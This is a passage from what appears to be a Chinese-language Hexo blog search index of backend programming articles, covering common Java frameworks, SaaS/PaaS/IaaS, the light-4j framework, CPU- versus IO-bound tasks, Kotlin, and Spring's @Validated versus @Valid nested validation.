Spring 组件的 Java 项目。</p><p><strong>官网：</strong></p><blockquote><p><a href="https://spring.io/projects/spring-boot">https://spring.io/projects/spring-boot</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/spring-projects/spring-boot">https://github.com/spring-projects/spring-boot</a></p></blockquote><h2 id="4-Spring-Cloud"><a href="#4-Spring-Cloud" class="headerlink" title="4.Spring Cloud"></a>4.Spring Cloud</h2><p>Spring Cloud 是一系列框架的有序集合，是目前最火热的微服务框架首选，它利用Spring Boot 的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、消息总线、负载均衡、断路器、数据监控等，都可以用 Spring Boot 的开发风格做到一键启动和部署。</p><p><strong>官网：</strong></p><blockquote><p><a href="http://projects.spring.io/spring-cloud/">http://projects.spring.io/spring-cloud/</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/spring-cloud">https://github.com/spring-cloud</a></p></blockquote><h2 id="5-Mybatis-iBatis"><a href="#5-Mybatis-iBatis" class="headerlink" title="5.Mybatis&#x2F; iBatis"></a>5.Mybatis&#x2F; iBatis</h2><p>iBatis 曾是开源软件组 Apache 推出的一种轻量级的对象关系映射持久层（ORM）框架，随着开发团队转投Google Code 旗下，ibatis 3.x 正式更名为 Mybatis，即：iBatis 2.x, MyBatis 3.x。</p><p><strong>官网：</strong></p><blockquote><p><a href="http://www.mybatis.org/mybatis-3/">http://www.mybatis.org/mybatis-3/</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/mybatis">https://github.com/mybatis</a></p></blockquote><h2 id="6-Hibernate"><a href="#6-Hibernate" class="headerlink" title="6.Hibernate"></a>6.Hibernate</h2><p>Hibernate 是一个开放源代码的对象关系映射框架，它对 JDBC 进行了非常轻量级的对象封装，它将 POJO 与数据库表建立映射关系，是一个全自动的 orm 框架。Hibernate 可以自动生成 SQL 语句，自动执行，使得 Java 程序员可以随心所欲的使用对象编程思维来操作数据库。</p><p><strong>官网：</strong></p><blockquote><p><a href="http://hibernate.org/">http://hibernate.org/</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/hibernate">https://github.com/hibernate</a></p></blockquote><h2 id="7-Dubbo"><a href="#7-Dubbo" class="headerlink" title="7.Dubbo"></a>7.Dubbo</h2><p>Dubbo是阿里巴巴开源的基于 Java 的高性能 RPC 分布式服务框架，现已成为 Apache 基金会孵化项目。使用 Dubbo 可以将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心，可用于提高业务复用灵活扩展，使前端应用能更快速的响应多变的市场需求。</p><p><strong>官网：</strong></p><blockquote><p><a href="http://dubbo.apache.org/">http://dubbo.apache.org</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/apache/incubator-dubbo">https://github.com/apache/incubator-dubbo</a></p></blockquote><h2 id="8-Netty"><a href="#8-Netty" class="headerlink" title="8.Netty"></a>8.Netty</h2><p>Netty 是由 JBOSS 提供的一个开源的、异步的、基于事件驱动的网络通信框架，用 Netty 可以快速开发高性能、高可靠性的网络服务器和客户端程序，Netty 简化了网络应用的编程开发过程，使开发网络编程变得异常简单。</p><p><strong>官网：</strong></p><blockquote><p><a href="https://netty.io/">https://netty.io/</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/netty/netty">https://github.com/netty/netty</a></p></blockquote><h2 id="9-Shiro"><a href="#9-Shiro" class="headerlink" title="9.Shiro"></a>9.Shiro</h2><p>Apache Shiro是一个强大而灵活的开源安全框架，它干净利落地处理身份认证，授权，企业会话管理和加密。</p><p><strong>官网：</strong></p><blockquote><p><a href="http://shiro.apache.org/">http://shiro.apache.org/</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/apache/shiro">https://github.com/apache/shiro</a></p></blockquote><h2 id="10-Ehcache"><a href="#10-Ehcache" class="headerlink" title="10.Ehcache"></a>10.Ehcache</h2><p>EhCache 是一个纯Java的进程内缓存框架，具有快速、精干等特点，是 Hibernate 中默认的CacheProvider。它使用的是 JVM 的堆内存，超过内存可以设置缓存到磁盘，企业版的可以使用 JVM 堆外的物理内存。</p><p><strong>官网：</strong></p><blockquote><p><a href="http://www.ehcache.org/">http://www.ehcache.org/</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/ehcache/ehcache3">https://github.com/ehcache/ehcache3</a></p></blockquote><h2 id="11-Quartz"><a href="#11-Quartz" class="headerlink" title="11.Quartz"></a>11.Quartz</h2><p>Quartz 是一个基于 Java 的广泛使用的开源的任务调度框架，做过定时任务的没有没用过这个框架的吧？</p><p><strong>官网：</strong></p><blockquote><p><a href="http://www.quartz-scheduler.org/">http://www.quartz-scheduler.org/</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/quartz-scheduler/quartz">https://github.com/quartz-scheduler/quartz</a></p></blockquote><h2 id="12-Velocity"><a href="#12-Velocity" class="headerlink" title="12.Velocity"></a>12.Velocity</h2><p>Velocity 是一个基于 Java 的模板引擎，简单而强大的模板语言为各种 Web 框架提供模板服务，来适配 MVC 模型。</p><p><strong>官网：</strong></p><blockquote><p><a href="http://velocity.apache.org/">http://velocity.apache.org/</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/apache/velocity-engine">https://github.com/apache/velocity-engine</a></p></blockquote><h2 id="13-jQuery"><a href="#13-jQuery" class="headerlink" title="13.jQuery"></a>13.jQuery</h2><p>jQuery是一个快速、简洁的 JavaScript 框架，它封装 JavaScript 常用的功能代码，提供一种简便的 JavaScript 设计模式，极大地简化了 JavaScript 编程。</p><p>虽然哥好久没做 Web 开发了，但哥也不曾忘记，也还记得一些常用的写法，如：</p><pre class="line-numbers language-none"><code class="language-none">$(&quot;#wx&quot;).html(&quot;javastack&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>官网：</strong></p><blockquote><p><a href="http://jquery.com/">http://jquery.com/</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="http://jquery.com/download/">http://jquery.com/download/</a></p></blockquote><h2 id="14-JUnit"><a href="#14-JUnit" class="headerlink" title="14.JUnit"></a>14.JUnit</h2><p>JUnit 是一个 Java 语言的单元测试框架，绝大多数 Java 的开发环境都已经集成了 JUnit 作为其单元测试的工具。</p><p><strong>官网：</strong></p><blockquote><p><a href="https://junit.org/">https://junit.org</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://github.com/junit-team/">https://github.com/junit-team/</a></p></blockquote><h2 id="15-Log4j"><a href="#15-Log4j" class="headerlink" title="15.Log4j"></a>15.Log4j</h2><p>Log4j 是 Apache 的一个开源日志框架，通过 Log4j 我们可以将程序中的日志信息输出到控制台、文件等来记录日志。作为一个最老牌的日志框架，它现在的主流版本是 Log4j2。Log4j2是重新架构的一款日志框架，抛弃了之前 Log4j 的不足，以及吸取了优秀日志框架 Logback 的设计。</p><p><strong>官网：</strong></p><blockquote><p><a href="https://logging.apache.org/log4j/2.x/">https://logging.apache.org/log4j/2.x/</a></p></blockquote><p><strong>源码：</strong></p><blockquote><p><a href="https://logging.apache.org/log4j/2.x/source-repository.html">https://logging.apache.org/log4j/2.x/source-repository.html</a></p></blockquote><p>如果上面的大部分没用过，甚至都没听说过，那就怀疑你是不是个假程序员了，要加油了。</p><p>这些都是 Java 程序员必备的开发框架，有些不一定是首选的选择，但这些一定是 Java 程序员必备的。。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SaaS,PaaS,IaaS都是什么鬼？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/SaaS,PaaS,IaaS%E9%83%BD%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/SaaS,PaaS,IaaS%E9%83%BD%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="IaaS"><a href="#IaaS" class="headerlink" title="IaaS"></a>IaaS</h2><p>Infrastructure as a Service，基础设施即服务。</p><p>假如你现在要做一个网站，你肯定要有一台服务器或者虚拟机，要么自己搭建，要么买服务器运营商的。说白了，IaaS就是解决企业硬件问题的，包括服务器、存储设备、网络设备等基础设施。基础设施有了，你就可以搭建环境了。</p><h2 id="PaaS"><a href="#PaaS" class="headerlink" title="PaaS"></a>PaaS</h2><p>Platform as a Service，平台即服务。</p><p>假如你现在要做一个网站，你不想自己买服务器搭环境，你就直接购买别人的PaaS服务。PaaS一般会为企业解决硬件的租赁问题，以及操作系统的选装，开发测试环境的搭建，及各种编程语言的选装等，提供一个运行的直接用的软件平台。有了PaaS你就可以在上面做开发工作了，当然，一些别的程序及软件还得你自己安装配置。</p><h2 id="SaaS"><a href="#SaaS" class="headerlink" title="SaaS"></a>SaaS</h2><p>Software as a Service，软件即服务。</p><p>你现在想做一个网站，你不会做，你只要购买别人的成熟软件，配置几下就能使用了。说白了就是卖软件的，你不用租用服务器，开发软件等费时间的工作，你直接购买别人的软件通过互联网就能使用，也不需要本地安装，也就是软件即服务的意思，你出钱，别人出软件服务。</p><h2 id="怎么选择？"><a href="#怎么选择？" class="headerlink" title="怎么选择？"></a>怎么选择？</h2><p>现在大部分企业都是选择Iaas服务，自己来搭建环境和开发软件，当然也不排除某些直接用的SaaS或者PaaS服务，具体看企业需求。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个比 Spring Boot 快 44 倍的 Java 框架！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/%E4%B8%80%E4%B8%AA%E6%AF%94%20Spring%20Boot%20%E5%BF%AB%2044%20%E5%80%8D%E7%9A%84%20Java%20%E6%A1%86%E6%9E%B6%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/%E4%B8%80%E4%B8%AA%E6%AF%94%20Spring%20Boot%20%E5%BF%AB%2044%20%E5%80%8D%E7%9A%84%20Java%20%E6%A1%86%E6%9E%B6%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>最近栈长看到一个框架，官方号称可以比 Spring Boot 快 44 倍，居然这么牛逼，有这么神奇吗？今天带大家来认识一下。</p><p>这个框架名叫：<strong>light-4j</strong>。</p><blockquote><p>官网简介：A fast, lightweight and more productive microservices framework</p></blockquote><p>很简单，翻译过来就是：一个快速、轻量级和更高效的微服务框架。</p><h4 id="为什么叫light-4j？"><a href="#为什么叫light-4j？" class="headerlink" title="为什么叫light-4j？"></a>为什么叫light-4j？</h4><p>全称应该是：Light for Java，意味着轻量级，并以闪电般的速度来使用 Java 编程。</p><h4 id="这个框架有什么用？"><a href="#这个框架有什么用？" class="headerlink" title="这个框架有什么用？"></a>这个框架有什么用？</h4><p><strong>1、降低成本</strong></p><p>为什么说它能降低成本，因为它速度非常快，占用内存也非常小。</p><p>重点来了，它比类似 Spring Boot 这种内嵌 Tomcat 式的主流微服务框架平台要快 44 倍，并且只需要用其 1&#x2F;5 内存，听起来是不是很牛逼，确实是节约了不少内存空间。</p><p>这里有一份 benchmark 的测试报告，它与 Spring Boot 及其他微服务平台作了一个比较：</p><p><img src="http://img.javastack.cn/20190322142231.png"></p><blockquote><p>详细报告：<a href="https://github.com/networknt/microservices-framework-benchmark">https://github.com/networknt/microservices-framework-benchmark</a></p></blockquote><p>很强大，性能与 Go 语言并肩，并且拥有更低的平均延迟。</p><p>这里还有一份与其他 web 框架的对比：</p><blockquote><p>详细报告：<a href="https://www.techempower.com/benchmarks/#section=data-r15&hw=ph&test=plaintext">https://www.techempower.com/benchmarks/#section=data-r15&amp;hw=ph&amp;test=plaintext</a></p></blockquote><p>性能表现非常靠前，吊打 Spring 等各种框架！</p><p><strong>2、丰富的特性</strong></p><ul><li>带有启动&#x2F;关闭钩子和各种中间件的插件架构</li><li>分布式OAuth2 JWT安全验证作为框架的一部分</li><li>基于OpenAPI规范进行请求和响应验证</li><li>收集测量指标并支持服务和客户端在控制台显示</li><li>全局运行时异常处理，如API异常及其他受检查异常</li><li>在日志输出前加密敏感数据，如：信用卡、SIN号等</li><li>为请求参数、请求头、BODY清除跨站攻击脚本</li><li>重要信息或整个请求&#x2F;响应的审计</li><li>请求体支持各种类型的content-type</li><li>配置标准化响应码及响应消息</li><li>支持外部配置化Docker环境所有模块</li><li>来自其他域名的跨域处理</li><li>支持对外提供的服务限速处理</li><li>服务发现与注册支持直连、Consul和Zookeeper</li><li>客户端侧发现和负载平衡，消除代理层</li><li>与Light-OAuth2紧密集成并支持可跟踪性</li></ul><p>栈长先介绍到这，大家感兴趣的可以去 Github 捣鼓……</p><blockquote><p>Github地址：<a href="https://github.com/networknt/light-4j">https://github.com/networknt/light-4j</a></p></blockquote><p><img src="http://img.javastack.cn/20190322135924.png"></p><h4 id="栈长有话说"><a href="#栈长有话说" class="headerlink" title="栈长有话说"></a>栈长有话说</h4><p>看完你可能觉得呵呵了，有人用吗？</p><p>这个栈长我目前没有可靠数据，但这个框架的性能表现和内存消耗真的非常惊人，以及它的各种功能特性都值得借鉴。</p><p>至于比 Spring Boot 框架要快 44 倍，这个大家也不用太纠结，Spring 发展到今天，经过国外各种大神的打磨，可以说是非常精湛。</p><p>Spring 日益宠大的同时，其内部依赖集成了太多东西，在性能这方面没其他框架强，确实能够理解，但 Spring 的生态圈是没有任何框架可以比拟的。在追求性能的同时，它肯定也会牺牲很多东西，所以，我觉得一个生态繁荣的技术平台比追求性能更重要。</p><p>最后，你们有公司用过这个框架吗？你对这个框架怎么看，欢迎留言讨论~</p><ul><li>Spring Boot 2.x 启动全过程源码分析</li><li>Spring Boot 自定义日志详解</li><li>Spring Boot 核心配置文件详解</li><li>Spring Boot 最核心的 25 个注解！</li><li>Spring Boot 集成Mybatis实现双数据源</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是 CPU 密集型、IO密集型？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/%E4%BB%80%E4%B9%88%E6%98%AF%20CPU%20%E5%AF%86%E9%9B%86%E5%9E%8B%E3%80%81IO%E5%AF%86%E9%9B%86%E5%9E%8B%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/%E4%BB%80%E4%B9%88%E6%98%AF%20CPU%20%E5%AF%86%E9%9B%86%E5%9E%8B%E3%80%81IO%E5%AF%86%E9%9B%86%E5%9E%8B%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="CPU密集型（CPU-bound）"><a href="#CPU密集型（CPU-bound）" class="headerlink" title="CPU密集型（CPU-bound）"></a>CPU密集型（CPU-bound）</h4><p>CPU密集型也叫计算密集型，指的是系统的硬盘、内存性能相对CPU要好很多，此时，系统运作大部分的状况是CPU Loading 100%，CPU要读&#x2F;写I&#x2F;O(硬盘&#x2F;内存)，I&#x2F;O在很短的时间就可以完成，而CPU还有许多运算要处理，CPU Loading很高。</p><p>在多重程序系统中，大部份时间用来做计算、逻辑判断等CPU动作的程序称之CPU bound。例如一个计算圆周率至小数点一千位以下的程序，在执行的过程当中绝大部份时间用在三角函数和开根号的计算，便是属于CPU bound的程序。</p><p>CPU bound的程序一般而言CPU占用率相当高。这可能是因为任务本身不太需要访问I&#x2F;O设备，也可能是因为程序是多线程实现因此屏蔽掉了等待I&#x2F;O的时间。</p><h4 id="IO密集型（I-O-bound）"><a href="#IO密集型（I-O-bound）" class="headerlink" title="IO密集型（I&#x2F;O bound）"></a>IO密集型（I&#x2F;O bound）</h4><p>IO密集型指的是系统的CPU性能相对硬盘、内存要好很多，此时，系统运作，大部分的状况是CPU在等I&#x2F;O (硬盘&#x2F;内存) 的读&#x2F;写操作，此时CPU Loading并不高。</p><p>I&#x2F;O bound的程序一般在达到性能极限时，CPU占用率仍然较低。这可能是因为任务本身需要大量I&#x2F;O操作，而pipeline做得不是很好，没有充分利用处理器能力。</p><h4 id="CPU密集型-vs-IO密集型"><a href="#CPU密集型-vs-IO密集型" class="headerlink" title="CPU密集型 vs IO密集型"></a>CPU密集型 vs IO密集型</h4><p>我们可以把任务分为计算密集型和IO密集型。</p><p>计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如计算圆周率、对视频进行高清解码等等，全靠CPU的运算能力。这种计算密集型任务虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低，所以，要最高效地利用CPU，计算密集型任务同时进行的数量应当等于CPU的核心数。</p><p>计算密集型任务由于主要消耗CPU资源，因此，代码运行效率至关重要。Python这样的脚本语言运行效率很低，完全不适合计算密集型任务。对于计算密集型任务，最好用C语言编写。</p><p>第二种任务的类型是IO密集型，涉及到网络、磁盘IO的任务都是IO密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待IO操作完成（因为IO的速度远远低于CPU和内存的速度）。对于IO密集型任务，任务越多，CPU效率越高，但也有一个限度。常见的大部分任务都是IO密集型任务，比如Web应用。</p><p>IO密集型任务执行期间，99%的时间都花在IO上，花在CPU上的时间很少，因此，用运行速度极快的C语言替换用Python这样运行速度极低的脚本语言，完全无法提升运行效率。对于IO密集型任务，最合适的语言就是开发效率最高（代码量最少）的语言，脚本语言是首选，C语言最差。</p><p>总之，计算密集型程序适合C语言多线程，I&#x2F;O密集型适合脚本语言开发的多线程。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是Kotlin？Java的替代语言？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/%E4%BB%80%E4%B9%88%E6%98%AFKotlin%EF%BC%9FJava%E7%9A%84%E6%9B%BF%E4%BB%A3%E8%AF%AD%E8%A8%80%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/%E4%BB%80%E4%B9%88%E6%98%AFKotlin%EF%BC%9FJava%E7%9A%84%E6%9B%BF%E4%BB%A3%E8%AF%AD%E8%A8%80%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Kotlin"><a href="#什么是Kotlin" class="headerlink" title="什么是Kotlin"></a>什么是Kotlin</h2><p>Kotlin是一个基于JVM的新的编程语言，2010年由IntelliJ IDEA所在的JetBrains公司开发，自2012年以来一直开源。</p><p>Kotlin可以编译成Java字节码，也可以编译成JavaScript，方便在没有JVM的设备上运行。</p><p>Kotlin是面向对象和功能编程功能的JVM和Android的通用、开源、静态的实用的编程语言。它专注于交互性、安全性及清晰度和工具的支持。</p><h2 id="设计理念"><a href="#设计理念" class="headerlink" title="设计理念"></a>设计理念</h2><p>1、创建一种兼容Java的语言</p><p>2、让它比Java更安全，能够静态检测常见的陷阱。如：引用空指针</p><p>3、让它比Java更简洁，通过支持variable type inference，higher-order functions (closures)，extension functions，mixins and first-class delegation等实现。</p><p>4、让它比最成熟的竞争对手Scala语言更加简单。</p><h2 id="Kotlin优势"><a href="#Kotlin优势" class="headerlink" title="Kotlin优势"></a>Kotlin优势</h2><p>1、简洁: 大大减少样板代码的数量。</p><p>2、安全: 避免空指针异常等整个类的错误。</p><p>3、互操作性: 充分利用 JVM、Android 和浏览器的现有库。</p><p>4、工具友好: 可用任何 Java IDE 或者使用命令行构建。</p><h2 id="代码转换"><a href="#代码转换" class="headerlink" title="代码转换"></a>代码转换</h2><p>Java代码：</p><pre class="line-numbers language-none"><code class="language-none">public class JavaCode &#123;    public String toJSON(Collection&lt;Integer&gt; collection) &#123;        StringBuilder sb &#x3D; new StringBuilder();        sb.append(&quot;[&quot;);        Iterator&lt;Integer&gt; iterator &#x3D; collection.iterator();        while (iterator.hasNext()) &#123;            Integer element &#x3D; iterator.next();            sb.append(element);            if (iterator.hasNext()) &#123;                sb.append(&quot;, &quot;);            &#125;        &#125;        sb.append(&quot;]&quot;);        return sb.toString();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转换成Kotlin代码：</p><pre class="line-numbers language-none"><code class="language-none">fun toJSON(collection: Collection&lt;Int&gt;): String &#123;    val sb &#x3D; StringBuilder()    sb.append(&quot;[&quot;)    val iterator &#x3D; collection.iterator()    while (iterator.hasNext())    &#123;        val element &#x3D; iterator.next()        sb.append(element)        if (iterator.hasNext())        &#123;            sb.append(&quot;, &quot;)        &#125;    &#125;    sb.append(&quot;]&quot;)    return sb.toString()&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看起来，Kotlin就像是一个简化的Java版本。Java和Kotlin两个语言可以互相转换。</p><h2 id="未来发展"><a href="#未来发展" class="headerlink" title="未来发展"></a>未来发展</h2><p>在Google I&#x2F;O 2017中，Google 宣布 Kotlin 成为 Android 官方开发语言。</p><p>需要注意的是目前在国内用的比较少，Kotlin也是比较赶潮流的语言，在开发语言中排名和影响力也比较落后，从Java转到Kotlin也非常容易，所有，有兴趣的同学可以研究试玩下。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>参数验证 @Validated 和 @Valid 的区别</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/%E5%8F%82%E6%95%B0%E9%AA%8C%E8%AF%81%20@Validated%20%E5%92%8C%20@Valid%20%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BB%BC%E5%90%88%E6%8A%80%E6%9C%AF/%E5%8F%82%E6%95%B0%E9%AA%8C%E8%AF%81%20@Validated%20%E5%92%8C%20@Valid%20%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>Spring Validation验证框架对参数的验证机制提供了@Validated（Spring’s JSR-303 规范，是标准 JSR-303 的一个变种），javax提供了@Valid（标准JSR-303规范），配合 BindingResult 可以直接提供参数验证结果。其中对于字段的特定验证注解比如 @NotNull 等网上到处都有，这里不详述</p><p>在检验 Controller 的入参是否符合规范时，使用 @Validated 或者 @Valid 在基本验证功能上没有太多区别。但是在分组、注解地方、嵌套验证等功能上两个有所不同：</p><h2 id="1-分组"><a href="#1-分组" class="headerlink" title="1. 分组"></a>1. 分组</h2><p>@Validated：提供了一个分组功能，可以在入参验证时，根据不同的分组采用不同的验证机制，这个网上也有资料，不详述。@Valid：作为标准JSR-303规范，还没有吸收分组的功能。</p><h2 id="2-注解地方"><a href="#2-注解地方" class="headerlink" title="2. 注解地方"></a>2. 注解地方</h2><p>@Validated：可以用在类型、方法和方法参数上。但是不能用在成员属性（字段）上</p><p>@Valid：可以用在方法、构造函数、方法参数和成员属性（字段）上</p><p>两者是否能用于成员属性（字段）上直接影响能否提供嵌套验证的功能。</p><h2 id="3-嵌套验证"><a href="#3-嵌套验证" class="headerlink" title="3. 嵌套验证"></a>3. 嵌套验证</h2><p>在比较两者嵌套验证时，先说明下什么叫做嵌套验证。比如我们现在有个实体叫做Item：</p><pre class="line-numbers language-none"><code class="language-none">public class Item &#123;    @NotNull(message &#x3D; &quot;id不能为空&quot;)    @Min(value &#x3D; 1, message &#x3D; &quot;id必须为正整数&quot;)    private Long id;    @NotNull(message &#x3D; &quot;props不能为空&quot;)    @Size(min &#x3D; 1, message &#x3D; &quot;至少要有一个属性&quot;)    private List&lt;Prop&gt; props;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Item带有很多属性，属性里面有属性id，属性值id，属性名和属性值，如下所示：</p><pre class="line-numbers language-none"><code class="language-none">public class Prop &#123;    @NotNull(message &#x3D; &quot;pid不能为空&quot;)    @Min(value &#x3D; 1, message &#x3D; &quot;pid必须为正整数&quot;)    private Long pid;    @NotNull(message &#x3D; &quot;vid不能为空&quot;)    @Min(value &#x3D; 1, message &#x3D; &quot;vid必须为正整数&quot;)    private Long vid;    @NotBlank(message &#x3D; &quot;pidName不能为空&quot;)    private String pidName;    @NotBlank(message &#x3D; &quot;vidName不能为空&quot;)    private String vidName;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>属性这个实体也有自己的验证机制，比如属性和属性值id不能为空，属性名和属性值不能为空等。</p><p>现在我们有个 ItemController 接受一个Item的入参，想要对Item进行验证，如下所示：</p><pre class="line-numbers language-none"><code class="language-none">@RestControllerpublic class ItemController &#123;    @RequestMapping(&quot;&#x2F;item&#x2F;add&quot;)    public void addItem(@Validated Item item, BindingResult bindingResult) &#123;        doSomething();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上图中，如果Item实体的props属性不额外加注释，只有@NotNull和@Size，无论入参采用@Validated还是@Valid验证，Spring Validation框架只会对Item的id和props做非空和数量验证，不会对props字段里的Prop实体进行字段验证，也就是@Validated和@Valid加在方法参数前，都不会自动对参数进行嵌套验证。也就是说如果传的List<Prop>中有Prop的pid为空或者是负数，入参验证不会检测出来。</p><p>为了能够进行嵌套验证，必须手动在Item实体的props字段上明确指出这个字段里面的实体也要进行验证。由于@Validated不能用在成员属性（字段）上，但是@Valid能加在成员属性（字段）上，而且@Valid类注解上也说明了它支持嵌套验证功能，那么我们能够推断出：@Valid加在方法参数时并不能够自动进行嵌套验证，而是用在需要嵌套验证类的相应字段上，来配合方法参数上@Validated或@Valid来进行嵌套验证。</p><p>我们修改Item类如下所示：</p><pre class="line-numbers language-none"><code class="language-none">public class Item &#123;    @NotNull(message &#x3D; &quot;id不能为空&quot;)    @Min(value &#x3D; 1, message &#x3D; &quot;id必须为正整数&quot;)    private Long id;    @Valid &#x2F;&#x2F; 嵌套验证必须用@Valid    @NotNull(message &#x3D; &quot;props不能为空&quot;)    @Size(min &#x3D; 1, message &#x3D; &quot;props至少要有一个自定义属性&quot;)    private List&lt;Prop&gt; props;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们在ItemController的addItem函数上再使用@Validated或者@Valid，就能对Item的入参进行嵌套验证。此时Item里面的props如果含有Prop的相应字段为空的情况，Spring Validation框架就会检测出来，bindingResult就会记录相应的错误。</p><p>总结一下 @Validated 和 @Valid 在嵌套验证功能上的区别：</p><p><strong>@Validated：</strong> 用在方法入参上无法单独提供嵌套验证功能。不能用在成员属性（字段）上，也无法提示框架进行嵌套验证。能配合嵌套验证注解@Valid进行嵌套验证。</p><p><strong>@Valid：</strong> 用在方法入参上无法单独提供嵌套验证功能。能够用在成员属性（字段）上，提示验证框架进行嵌套验证。能配合嵌套验证注解@Valid进行嵌套验证。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>缓存雪崩，穿透，预热，热备都是什么鬼？</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BC%93%E5%AD%98/%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9%EF%BC%8C%E7%A9%BF%E9%80%8F%EF%BC%8C%E9%A2%84%E7%83%AD%EF%BC%8C%E7%83%AD%E5%A4%87%E9%83%BD%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/%E7%BC%93%E5%AD%98/%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9%EF%BC%8C%E7%A9%BF%E9%80%8F%EF%BC%8C%E9%A2%84%E7%83%AD%EF%BC%8C%E7%83%AD%E5%A4%87%E9%83%BD%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/</url>
      
